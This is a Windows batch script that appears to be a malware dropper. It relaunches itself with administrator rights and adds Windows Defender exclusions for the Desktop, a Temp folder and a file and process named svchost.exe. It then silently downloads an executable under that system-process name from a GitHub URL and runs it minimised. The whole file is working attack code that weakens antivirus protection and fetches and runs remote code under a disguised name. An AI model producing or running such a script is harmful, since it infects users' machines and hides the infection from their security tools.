@echo off
setlocal enabledelayedexpansion

:: Check if running as administrator
openfiles > nul 2>&1
if %errorlevel%==0 (
    goto :run_script
) else (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process -FilePath '%~dp0%~nx0' -Verb RunAs"
    exit
)

:run_script
echo Adding Defender exclusions...

:: Add Defender exclusions
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp' -ErrorAction SilentlyContinue"
if %errorlevel%==0 (
    echo Exclusion added for C:\Users\%username%\AppData\Roaming\Temp
) else (
    echo Error adding exclusion for C:\Users\%username%\AppData\Roaming\Temp
)

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp\svchost.exe' -ErrorAction SilentlyContinue"
if %errorlevel%==0 (
    echo Exclusion added for C:\Users\%username%\AppData\Roaming\Temp\svchost.exe
) else (
    echo Error adding exclusion for C:\Users\%username%\AppData\Roaming\Temp\svchost.exe
)

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
if %errorlevel%==0 (
    echo Exclusion added for svchost.exe process
) else (
    echo Error adding exclusion for svchost.exe process
)

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\Desktop' -ErrorAction SilentlyContinue"
if %errorlevel%==0 (
    echo Exclusion added for C:\Users\%username%\Desktop
) else (
    echo Error adding exclusion for C:\Users\%username%\Desktop
)

echo Downloading svchost.exe...

:: Download svchost.exe from the specified URL
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe', '%USERPROFILE%\Desktop\svchost.exe')"
if %errorlevel%==0 (
    echo svchost.exe downloaded successfully
) else (
    echo Error downloading svchost.exe
)

echo Running svchost.exe...

:: Run svchost.exe silently
start "" /min "%USERPROFILE%\Desktop\svchost.exe"

echo Script completed.
